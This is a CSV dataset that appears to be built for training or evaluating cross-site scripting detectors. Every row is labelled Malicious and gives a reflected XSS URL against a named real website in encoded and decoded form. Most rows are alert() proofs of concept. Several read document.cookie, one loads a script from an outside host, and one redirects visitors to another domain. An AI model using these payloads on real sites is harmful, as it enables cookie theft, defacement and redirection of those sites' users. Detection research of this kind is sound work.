Payloads,Class,decoded,executed,parser_changed
http://bbs.yizheng.gov.cn/showforum.asp?forumid=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://bbs.yizheng.gov.cn/showforum.asp?forumid=""><script>alert(""maxwel"")</script>",True,True
http://www.dominiquemary.fr/panier/achat/recherche.php?motclef=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/scr<br>ipt&gt;,Malicious,"http://www.dominiquemary.fr/panier/achat/recherche.php?motclef=""><script>alert(document.cookie)</script>",True,True
http://buyersguide.eweek.com/company/listcompaniesbysite.asp?getlistby=%22%3e%3cscript%3ealert(%22by<br>%20encore%20!%22)%3c/script%3e,Malicious,"http://buyersguide.eweek.com/company/listcompaniesbysite.asp?getlistby=""><script>alert(""by encore !"")</script>",True,True
http://fw36.members.freewebs.com/page.jsp?page=&quot;);&lt;/script&gt;&lt;script&gt;alert(123)&lt;/script&gt;,Malicious,"http://fw36.members.freewebs.com/page.jsp?page="");</script><script>alert(123)</script>",True,True
http://www.cnlcs.min-saude.pt/pesqres.asp?startrec=0&amp;base=web&amp;form=comp&amp;recpag=5&amp;searchtxt=&quot;&gt;&lt;script<br>&gt;alert(document.cookie)&lt;/script&gt;,Malicious,"http://www.cnlcs.min-saude.pt/pesqres.asp?startrec=0&base=web&form=comp&recpag=5&searchtxt=""><script>alert(document.cookie)</script>",True,True
http://www.greenpeace.org/usa/news/offshore-drilling-it-s-not-t'&quot;&gt;&lt;/title&gt;&lt;script&gt;alert(1337)&lt;/scrip<br>t&gt;&gt;&lt;marquee&gt;&lt;h1&gt;xss%20by%20xylitol&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.greenpeace.org/usa/news/offshore-drilling-it-s-not-t'""></title><script>alert(1337)</script>><marquee><h1>xss by xylitol</h1></marquee>",True,True
http://www.hallvord.com/commentform.php?http_referer_js=/blog/2008/january/sometimesutf8isthewrongch<br>oice.en.htm%22%3e%3cimg/src/onerror=alert(/xss/.source)%3e%3cfoo%20bar=%22,Malicious,"http://www.hallvord.com/commentform.php?http_referer_js=/blog/2008/january/sometimesutf8isthewrongchoice.en.htm""><img/src/onerror=alert(/xss/.source)><foo bar=""",True,True
http://www.athensattica.gr/index.cfm?lang_id=2&quot;&gt;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious,"http://www.athensattica.gr/index.cfm?lang_id=2"">><script>alert(document.cookie)</script>",True,True
http://indiannations.visitmt.com/categories/primary.asp?title=&lt;script&gt;alert(&quot;scriptorium(turkey)&quot;)&lt;/<br>script&gt;&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;url=http://www.canixim.com&quot;&gt;,Malicious,"http://indiannations.visitmt.com/categories/primary.asp?title=<script>alert(""scriptorium(turkey)"")</script><meta http-equiv=""refresh"" content=""0;url=http://www.canixim.com"">",True,True
http://www.cyberax.net/site_search.asp?search=%3e%22%3e%3cscript%3ealert%28%27xss%20-%20vuln%27%29%3<br>c%2fscript%3e,Malicious,"http://www.cyberax.net/site_search.asp?search=>""><script>alert('xss - vuln')</script>",True,True
http://www.southernfriedclickin.info/index.php?ref=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious,"http://www.southernfriedclickin.info/index.php?ref=""><script>alert(document.cookie);</script>",True,True
http://tv1.rtp.pt/noticias/?headline=41&visual=10&text_page=1&search=%3e%22%3e%3cscript%3ealert(%22xss%22)%3c/script%3e,Malicious,"http://tv1.rtp.pt/noticias/?headline=41&visual=10&text_page=1&search=>""><script>alert(""xss"")</script>",True,True
http://home.tudelft.nl/index.php?id=781&amp;q=/&quot;&gt;&lt;script&gt;alert('xss by<br>atm0n3r')&lt;/script&gt;&amp;searchradio=on&amp;option=start&amp;min=10&amp;start=0,Malicious,"http://home.tudelft.nl/index.php?id=781&q=/""><script>alert('xss byatm0n3r')</script>&searchradio=on&option=start&min=10&start=0",True,True
http://www.achaea.com/irex/helpview/help.php?q=%22%3e%3cscript%3ealert(%22xss%22)%3c%2fscript%3e&amp;x=h<br>elp,Malicious,"http://www.achaea.com/irex/helpview/help.php?q=""><script>alert(""xss"")</script>&x=help",True,True
http://lazylaces.brinkster.net/search.asp?s=point'n'click&quot;&gt;&lt;script&gt;alert(&quot;bluemax&quot;)&lt;/script&gt;,Malicious,"http://lazylaces.brinkster.net/search.asp?s=point'n'click""><script>alert(""bluemax"")</script>",True,True
http://www.redexport.gov.ar/avisos/?menu_id=%22%3e%3cscript%3ealert(/xss/)%3c/script%3e,Malicious,"http://www.redexport.gov.ar/avisos/?menu_id=""><script>alert(/xss/)</script>",True,True
http://msn.brchef.com.br/index/interna.php?destino=receita&amp;modulo=receitas&amp;rec_id=%22%3e%3cscript%3e<br>alert(%22scr34m%22)%3c/script%3e,Malicious,"http://msn.brchef.com.br/index/interna.php?destino=receita&modulo=receitas&rec_id=""><script>alert(""scr34m"")</script>",True,True
http://houston.bbb.org/wwwroot/search.aspx?site=148&amp;s=xss%22%3e%3cscript%3ealert%28document.cookie%2<br>9%3c/script%3e,Malicious,"http://houston.bbb.org/wwwroot/search.aspx?site=148&s=xss""><script>alert(document.cookie)</script>",True,True
http://suapsi.comune.siena.it/supera/jsp/home.do?sportello=%3e%22%3e%3cscript%3ealert(%22xss%22)%3c/<br>script%3e,Malicious,"http://suapsi.comune.siena.it/supera/jsp/home.do?sportello=>""><script>alert(""xss"")</script>",True,True
http://www.santander.com/csgs/satellite?accesibilidad=3&amp;canal=caccionistas&amp;cid=1147087106975&amp;empr=sa<br>ncorporativo&amp;leng=es_es&amp;pagename=sancorporativo/page/sc_contenedorbuscadorgeneral&amp;pagina=99999999999<br>99999999'&quot;&gt;&lt;script&gt;alert(/xss/);&lt;/script&gt;,Malicious,"http://www.santander.com/csgs/satellite?accesibilidad=3&canal=caccionistas&cid=1147087106975&empr=sancorporativo&leng=es_es&pagename=sancorporativo/page/sc_contenedorbuscadorgeneral&pagina=9999999999999999999'""><script>alert(/xss/);</script>",True,True
http://www.trekstor.de/en/products/detail_mp3.php?pid=66%22%3e%3cscript%3ealert%281337%29%3c/script%<br>3e&amp;page=1,Malicious,"http://www.trekstor.de/en/products/detail_mp3.php?pid=66""><script>alert(1337)</script>&page=1",True,True
http://www.yaoun.com/caigou.asp?id=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;backdoor&lt;/<br>h1&gt;&lt;/marquee&gt;,Malicious,"http://www.yaoun.com/caigou.asp?id=""><script>alert(document.cookie)</script>><marquee><h1>backdoor</h1></marquee>",True,True
http://www.ethnologue.com/country_index.asp?place=%3e%22%3e%3cscript%20%3ealert(1337);%3c/script%3e,Malicious,"http://www.ethnologue.com/country_index.asp?place=>""><script >alert(1337);</script>",True,True
http://benq.no/press/news.cfm?id=1882&amp;cat=2&amp;year=&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+nar<br>coticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://benq.no/press/news.cfm?id=1882&cat=2&year=""><script>alert('xss')</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
http://community.hereignsnetwork.com/service/searcheverything.kickaction?keywords=&quot;&gt;&lt;script&gt;alert(1)<br>;&lt;/script&gt;&amp;includevideo=on&amp;includeaudio=on&amp;includephoto=on&amp;includeblog=on&amp;includeuser=on&amp;includegrou<br>ps=on&amp;includemessages=on&amp;as=83239,Malicious,"http://community.hereignsnetwork.com/service/searcheverything.kickaction?keywords=""><script>alert(1);</script>&includevideo=on&includeaudio=on&includephoto=on&includeblog=on&includeuser=on&includegroups=on&includemessages=on&as=83239",True,True
http://ms140.mysearch.com/search/ggweb.jhtml?searchfor=%22%3e%3cscript%3ealert(%22maxwel%22)%3c/scri<br>pt%3e,Malicious,"http://ms140.mysearch.com/search/ggweb.jhtml?searchfor=""><script>alert(""maxwel"")</script>",True,True
http://www.xuecheng.gov.cn/artcontent.asp?artid=3768%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/<br>script%3e%27%22%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious,"http://www.xuecheng.gov.cn/artcontent.asp?artid=3768'""></title><script>alert(1337)</script>'""><marquee><h1>xss by xylitol</h1></marquee>",True,True
http://www.chirac-en-lozere.com/fr/search?query=&quot;&gt;&lt;script&gt;alert('xss by atm0n3r')&lt;/script&gt;&amp;x=0&amp;y=0,Malicious,"http://www.chirac-en-lozere.com/fr/search?query=""><script>alert('xss by atm0n3r')</script>&x=0&y=0",True,True
http://www.globalhealthreporting.org/news.asp?id=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://www.globalhealthreporting.org/news.asp?id=""><script>alert(""maxwel"")</script>",True,True
http://search.ironspeed.com/search?q=%22%3e%3cscript%3ealert(%22xssed%22);%3c/script%3e&btng.x=0&btng.y=0&btng=search&restrict=allhelp&site=c1&output=xml_no_dtd&client=c1&proxystylesheet=http%3a%2f%2fwww.ironspeed.com%2fsearch%2fkbstyle.xsl,Malicious,"http://search.ironspeed.com/search?q=""><script>alert(""xssed"");</script>&btng.x=0&btng.y=0&btng=search&restrict=allhelp&site=c1&output=xml_no_dtd&client=c1&proxystylesheet=http://www.ironspeed.com/search/kbstyle.xsl",True,True
http://www.cse.com.cy/en/insider/instrading.asp?code=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://www.cse.com.cy/en/insider/instrading.asp?code=""><script>alert(""maxwel"")</script>",True,True
http://r.neuf.fr/recherche9.asp?query=&quot;&gt;&lt;script&gt;alert(&quot;x&quot;);&lt;/script&gt;,Malicious,"http://r.neuf.fr/recherche9.asp?query=""><script>alert(""x"");</script>",True,True
http://www.ofsted.gov.uk/content/advancedsearch/summary?searchtext='&quot;&gt;&lt;script&gt;alert('www.xssed.com')<br>&lt;/script&gt;,Malicious,"http://www.ofsted.gov.uk/content/advancedsearch/summary?searchtext='""><script>alert('www.xssed.com')</script>",True,True
https://www.probank.gr/search/index.php?qu=%22%3cmarquee%3e%3cimg+src%3dk.png+onerror%3dalert(%2fxss<br>%2f)+%2f%3e%3ch1%3exssed%3c%2fh1%3e,Malicious,"https://www.probank.gr/search/index.php?qu=""<marquee><img src=k.png onerror=alert(/xss/) /><h1>xssed</h1>",True,True
http://www.kelebekforum.org/non_rte_javascript.asp?textarea=&lt;script&gt;alert(/the-sh0ck-b0y/)&lt;/script&gt;,Malicious,http://www.kelebekforum.org/non_rte_javascript.asp?textarea=<script>alert(/the-sh0ck-b0y/)</script>,True,True
http://www.expartners.com/member/profile.php?profile_id=&quot;&gt;&lt;script&gt;alert(&quot;backdoor&quot;)&lt;/script&gt;,Malicious,"http://www.expartners.com/member/profile.php?profile_id=""><script>alert(""backdoor"")</script>",True,True
http://kmwgallery.gohsphere.com/gallery/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;ma<br>rquee&gt;&lt;h1&gt;by%20narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://kmwgallery.gohsphere.com/gallery/igallery.asp?d=""><script>alert(document.cookie)</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
http://gamerzone.com.br/forum/redirector.php?url=%22%3e%3cscript%3ealert(2)%3c/script%3e,Malicious,"http://gamerzone.com.br/forum/redirector.php?url=""><script>alert(2)</script>",True,True
http://www.pingel-anton.de/cms/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1<br>&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.pingel-anton.de/cms/index.php?page=""><script>alert(document.cookie)</script>><marquee><h1>backdoor</h1></marquee>",True,True
http://www.e17.fr/fr/goto/recherche.html?searchval=%22%3e%3cscript%3ealert(%22defaced%20by%20sponsfu<br>ll%22);%3c/script%3e,Malicious,"http://www.e17.fr/fr/goto/recherche.html?searchval=""><script>alert(""defaced by sponsfull"");</script>",True,True
http://www.ripoffreport.com/login.asp?message=%3cscript%3ealert(1337)%3c/script%3e,Malicious,http://www.ripoffreport.com/login.asp?message=<script>alert(1337)</script>,True,True
http://www.wickaudio.ch/igallery34/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee<br>&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.wickaudio.ch/igallery34/igallery.asp?d=""><script>alert(document.cookie)</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
http://es.888.com/new888/home.htm?page=gettingstarted&amp;lang=%22%3e%3cscript%3ealert(document.cookie)%<br>3c/script%3e,Malicious,"http://es.888.com/new888/home.htm?page=gettingstarted&lang=""><script>alert(document.cookie)</script>",True,True
http://www.innovation.sa.gov.au/static/test.php?a[]=%3cscript%3ealert(/xssed_by_omeha/);%3c/script%3<br>e%3cscript%3ealert(document.cookie);%3c/script%3e,Malicious,http://www.innovation.sa.gov.au/static/test.php?a[]=<script>alert(/xssed_by_omeha/);</script><script>alert(document.cookie);</script>,True,True
http://www.datingsuncast.com/member/profile.php?profile_id=&quot;&gt;&lt;script&gt;alert(&quot;backdoor&quot;)&lt;/script&gt;,Malicious,"http://www.datingsuncast.com/member/profile.php?profile_id=""><script>alert(""backdoor"")</script>",True,True
http://www.buyskool.com/search.php?min_cur=&amp;mode=advanced&amp;max_cur=&amp;seller=include&amp;seller_name=&quot;&gt;&lt;scr<br>ipt&gt;alert(document.cookie)&lt;/script&gt;,Malicious,"http://www.buyskool.com/search.php?min_cur=&mode=advanced&max_cur=&seller=include&seller_name=""><script>alert(document.cookie)</script>",True,True
http://www.theatronhometheater.com/index.php?page=&quot;&gt;&lt;/iframe&gt;&lt;script&gt;alert(1);&lt;/script&gt;&amp;pagetitle=&lt;/<br>title&gt;&lt;script&gt;alert(1);&lt;/script&gt;,Malicious,"http://www.theatronhometheater.com/index.php?page=""></iframe><script>alert(1);</script>&pagetitle=</title><script>alert(1);</script>",True,True
http://www.defencejobs.gov.au/default.asp?initmedia=1&amp;media=flash&amp;bounceback=%3e%22%3e%3cscript%20%0<br>a%0d%3ealert('noph0bia')%3b%3c/script%3e,Malicious,"http://www.defencejobs.gov.au/default.asp?initmedia=1&media=flash&bounceback=>""><script 
>alert('noph0bia');</script>",True,True
http://wcrp.wmo.int/search-wcrp?query=%22%3e%3cscript%3ealert(/xss%20by%20warvector/)%3c%2fscript%3e<br>%3ccenter%3e%3cp%20style=background-color:red%20color:white%3e%3cimg%20src=http://warvector.u7n.org/<br>images/logo.gif%3e%3cmarquee%3e%3ch1%3exss%20by%20warvector%20=)%3c/h1%3e%3c/marquee%3e,Malicious,"http://wcrp.wmo.int/search-wcrp?query=""><script>alert(/xss by warvector/)</script><center><p style=background-color:red color:white><img src=http://warvector.u7n.org/images/logo.gif><marquee><h1>xss by warvector =)</h1></marquee>",True,True
http://support.damanet.ch/index.php?&lt;script%20language=&quot;javascript&quot;%20src=&quot;http://kabustr.com/c%20ha<br>t/c.js&quot;%20type=&quot;text/javascript&quot;&gt;kabus-kabustr.com-kabus-kabustr.com&lt;/script&gt;&lt;script&gt;alert(documen%2<br>0t.cookie);&lt;/script&gt;&lt;script&gt;alert(/kabus/);&lt;/script&gt;,Malicious,"http://support.damanet.ch/index.php?<script language=""javascript"" src=""http://kabustr.com/c hat/c.js"" type=""text/javascript"">kabus-kabustr.com-kabus-kabustr.com</script><script>alert(documen t.cookie);</script><script>alert(/kabus/);</script>",True,True
http://www.cwb.gov.tw/search-cgi/query_admin.exe?opcode=show_advance_search&amp;user=idquest&amp;tfile=cwb_a<br>dvance_search_form_en.html&amp;sfile=cwb_advance_search_single_entry_en.html%27%22%3e%3c/title%3e%3cscri<br>pt%3ealert(1337)%3c/script%3e%27%22%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious,"http://www.cwb.gov.tw/search-cgi/query_admin.exe?opcode=show_advance_search&user=idquest&tfile=cwb_advance_search_form_en.html&sfile=cwb_advance_search_single_entry_en.html'""></title><script>alert(1337)</script>'""><marquee><h1>xss by xylitol</h1></marquee>",True,True
http://amihackerproof.com/results/tos.php?scan_id=25988%3c/script%3e%3cscript%3ealert('xss');%3c/script%3e,Malicious,http://amihackerproof.com/results/tos.php?scan_id=25988</script><script>alert('xss');</script>,True,True
http://stats.wwe.com/signup/signup.asp?error=24&amp;fn=arham&amp;ln=&quot;&gt;&lt;script&gt;alert(&quot;a rham<br>muhammad&quot;)&lt;/script&gt;&amp;email=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious,"http://stats.wwe.com/signup/signup.asp?error=24&fn=arham&ln=""><script>alert(""a rhammuhammad"")</script>&email=""><script>alert(document.cookie)</script>",True,True
http://www.basatder.com/foto_galeri/login.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marq<br>uee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.basatder.com/foto_galeri/login.asp?folder=""><script>alert(document.cookie)</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
http://www.moving.com/login.asp?redirect=&quot;&gt;&lt;script&gt;alert('kurtefendy')&lt;/script&gt;,Malicious,"http://www.moving.com/login.asp?redirect=""><script>alert('kurtefendy')</script>",True,True
http://www.iwindsurf.com/services.iws?info=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://www.iwindsurf.com/services.iws?info=""><script>alert(""maxwel"")</script>",True,True
http://www.tango04.com/fr/actualites/newsdetail.php?id=%27%22%3e%3c/title%3e%3cscript%3ealert%281%29<br>%3c/script%3e,Malicious,"http://www.tango04.com/fr/actualites/newsdetail.php?id='""></title><script>alert(1)</script>",True,True
http://www.yandex.ru/yandsearch?stype=www&amp;nl=0&amp;text=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious,"http://www.yandex.ru/yandsearch?stype=www&nl=0&text=""><script>alert(document.cookie)</script>",True,True
http://ms135.mysearch.com/search/ggweb.jhtml?searchfor=%22%3e%3cscript%3ealert(%22maxwel%22)%3c/scri<br>pt%3e,Malicious,"http://ms135.mysearch.com/search/ggweb.jhtml?searchfor=""><script>alert(""maxwel"")</script>",True,True
http://www.fin.gc.ca/finsearch/finresults_e.asp?who=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://www.fin.gc.ca/finsearch/finresults_e.asp?who=""><script>alert(""maxwel"")</script>",True,True
http://www.itsdeployment.its.dot.gov/resultkeyword.asp?keyword=%22%3e%3ch1%3ebackdoor%3cscript%3eale<br>rt(1)%3c/script%3e,Malicious,"http://www.itsdeployment.its.dot.gov/resultkeyword.asp?keyword=""><h1>backdoor<script>alert(1)</script>",True,True
http://www.overheardinathens.com/poster/?n=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://www.overheardinathens.com/poster/?n=""><script>alert(""maxwel"")</script>",True,True
http://www3.swansea.gov.uk/cmsr/info/greenmap/details.asp?ref=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://www3.swansea.gov.uk/cmsr/info/greenmap/details.asp?ref=""><script>alert(""maxwel"")</script>",True,True
"http://webreply.baytsp.com/webreply/webreply.jsp?customerid=197&amp;commhash=&quot;&gt;&lt;script&gt;alert('credit<br>doesnt go to me, just wanted it mirrored');&lt;/script&gt;",Malicious,"http://webreply.baytsp.com/webreply/webreply.jsp?customerid=197&commhash=""><script>alert('creditdoesnt go to me, just wanted it mirrored');</script>",True,True
http://zibidi.com/tr/sozluk.asp?x=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://zibidi.com/tr/sozluk.asp?x=""><script>alert(""maxwel"")</script>",True,True
http://wideovercast.net/u.asp?u=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://wideovercast.net/u.asp?u=""><script>alert(""maxwel"")</script>",True,True
http://31.911-job.ru/az.php?zc=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://31.911-job.ru/az.php?zc=""><script>alert(""maxwel"")</script>",True,True
http://www.mariabingo.com/changelocale.php?lang=&quot;&gt;&lt;script&gt;alert(123)&lt;/script&gt;&amp;frompage=%2findex.php%<br>3flogout%3d1,Malicious,"http://www.mariabingo.com/changelocale.php?lang=""><script>alert(123)</script>&frompage=/index.php?logout=1",True,True
http://www.pmo.co.kr/pda.html?ip=board/board.asp&amp;pp=board/contents_view.asp&amp;board_name=free_board&amp;li<br>st_type=search&amp;item=tnc&amp;keyword=%22%3e%3cscript%3ealert(0)%3c/script%3e&amp;n_idx=4984&amp;group=4554&amp;order=<br>0&amp;level=0&amp;cpage=2,Malicious,"http://www.pmo.co.kr/pda.html?ip=board/board.asp&pp=board/contents_view.asp&board_name=free_board&list_type=search&item=tnc&keyword=""><script>alert(0)</script>&n_idx=4984&group=4554&order=0&level=0&cpage=2",True,True
http://search.mit.edu/search?q=%22%3e%3cscript%3ealert%28%2fxss%2f%29%3b%3c%2fscript%3e&amp;btng.x=0&amp;btn<br>g.y=0&amp;site=mit&amp;client=mit&amp;proxystylesheet=http%3a%2f%2fspruce-goose.csail.mit.edu%2fsearch%2fgoogle-<br>csail.xsl&amp;output=xml_no_dtd&amp;as_dt=i&amp;as_oq=site%3awww.csail.mit.edu%20site%3apublications.csail.mit.e<br>du,Malicious,"http://search.mit.edu/search?q=""><script>alert(/xss/);</script>&btng.x=0&btng.y=0&site=mit&client=mit&proxystylesheet=http://spruce-goose.csail.mit.edu/search/google-csail.xsl&output=xml_no_dtd&as_dt=i&as_oq=site:www.csail.mit.edu site:publications.csail.mit.edu",True,True
"http://www.hellojack.com/jacknews/search.php?dosearch=yes&story=""><script>alert(0);</script>&title=""><script>alert(1);</script>&user=""><script>alert(2);</script>&from_date_day=&from_date_month=&from_date_year=&to_date_day=&to_date_month=&to_date_year=",Malicious,"http://www.hellojack.com/jacknews/search.php?dosearch=yes&story=""><script>alert(0);</script>&title=""><script>alert(1);</script>&user=""><script>alert(2);</script>&from_date_day=&from_date_month=&from_date_year=&to_date_day=&to_date_month=&to_date_year=",True,True
http://www.unix.org/online-pubs-short?doc=%22%3e%3cscript%3ealert(%22daimon--unix%20system%20bugs%22<br>)%3c/script%3e,Malicious,"http://www.unix.org/online-pubs-short?doc=""><script>alert(""daimon--unix system bugs"")</script>",True,True
https://www.domaintools.com/login/?t=3438&amp;email=&quot;&gt;&lt;script&gt;alert(&quot;backdoor&quot;)&lt;/script&gt;,Malicious,"https://www.domaintools.com/login/?t=3438&email=""><script>alert(""backdoor"")</script>",True,True
http://search.amd.com/query.html?col=test&amp;ht=test1&amp;la=en&amp;qt=%22%3e%3cscript%3ealert(1)%3c/script%3e&amp;<br>qs=|+language%3aen&amp;ct=1325960345&amp;qm=1&amp;ql=&amp;lk=1&amp;rf=0&amp;ws=0&amp;tqmhak=0&amp;lap=%22%3e%3cscript%3ealert(1)%3c/<br>script%3e,Malicious,"http://search.amd.com/query.html?col=test&ht=test1&la=en&qt=""><script>alert(1)</script>&qs=| language:en&ct=1325960345&qm=1&ql=&lk=1&rf=0&ws=0&tqmhak=0&lap=""><script>alert(1)</script>",True,True
http://www.cankiriizci.com/mkportal/include/pmpopup.php?u1=&lt;script&gt;alert(document.cookie)&lt;/script&gt;&amp;m<br>2=&lt;h1&gt;hacked%20by%20dylebron&lt;/h1&gt;&amp;m3=by&amp;m4=&lt;h1&gt;xss%20show&lt;/h1&gt;,Malicious,http://www.cankiriizci.com/mkportal/include/pmpopup.php?u1=<script>alert(document.cookie)</script>&m2=<h1>hacked by dylebron</h1>&m3=by&m4=<h1>xss show</h1>,True,True
http://www.digra.org/dl/export_endnote?chid=05164.35393%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%<br>3c/script%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious,"http://www.digra.org/dl/export_endnote?chid=05164.35393'""></title><script>alert(1337)</script>><marquee><h1>xss by xylitol</h1></marquee>",True,True
http://www.avatarmovie.com/becomeanavatar/index.php?uid=f1e27f7794e2a9850957ad5adea90cbe&amp;n=%3cscript<br>%3ealert%28/zack%20@%20insecurity.ro/%29%3c/script%3e,Malicious,http://www.avatarmovie.com/becomeanavatar/index.php?uid=f1e27f7794e2a9850957ad5adea90cbe&n=<script>alert(/zack @ insecurity.ro/)</script>,True,True
https://www.sharif.edu/fa/about/vtour.jsp?d=1%22/%3e%3cscript%3ealert%28/securitylab.ir/%29%3c/scrip<br>t%3e&amp;i=gate,Malicious,"https://www.sharif.edu/fa/about/vtour.jsp?d=1""/><script>alert(/securitylab.ir/)</script>&i=gate",True,True
http://www.arcadepanic.com/game.php?id=linegame&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious,"http://www.arcadepanic.com/game.php?id=linegame""><script>alert(document.cookie)</script>",True,True
http://www.wb.dl.gov.cn/search/search.vm?action=search&amp;content=%27%22%3e%3c/title%3e%3cscript%3ealer<br>t(1337)%3c/script%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious,"http://www.wb.dl.gov.cn/search/search.vm?action=search&content='""></title><script>alert(1337)</script>><marquee><h1>xss by xylitol</h1></marquee>",True,True
http://www.fema.gov/goodbye/goodbye.jsp?url=%3cscript%3ealert%28%22geewiz%22%29%3c%2fscript%3e,Malicious,"http://www.fema.gov/goodbye/goodbye.jsp?url=<script>alert(""geewiz"")</script>",True,True
http://www.jrspharma.de/pharma/wdeutsch/system/suche_popup.shtml?action=search&amp;configurationid=%22%3<br>e%3cscript%3ealert(1337)%3c/script%3e,Malicious,"http://www.jrspharma.de/pharma/wdeutsch/system/suche_popup.shtml?action=search&configurationid=""><script>alert(1337)</script>",True,True
http://support.aide.gov.tw/sub_page_index.php?c_id=35&amp;c_parentid=22&amp;c_rootid=%20}%3c/style%3e%3cscri<br>pt%3ea=eval;b=alert;a(b(/xss/.source));%3c/script%3e%3cmarquee%20bgcolor=%22red%22%3e%3ch1%3exss%20b<br>y%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious,"http://support.aide.gov.tw/sub_page_index.php?c_id=35&c_parentid=22&c_rootid= }</style><script>a=eval;b=alert;a(b(/xss/.source));</script><marquee bgcolor=""red""><h1>xss by xylitol</h1></marquee>",True,True
http://weather.chicagotribune.com/radar/radblast.asp?id=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;,Malicious,"http://weather.chicagotribune.com/radar/radblast.asp?id=""><script>alert(1)</script>",True,True
http://search.fasthealth.com/cgi-bin/texis/webinator/search/?query=%3c%2ftitle%3e%3cscript%3ealert%2<br>8123%29%3c%2fscript%3e&amp;station=h_mcm_tx&amp;search.x=0&amp;search.y=0,Malicious,http://search.fasthealth.com/cgi-bin/texis/webinator/search/?query=</title><script>alert(123)</script>&station=h_mcm_tx&search.x=0&search.y=0,True,True
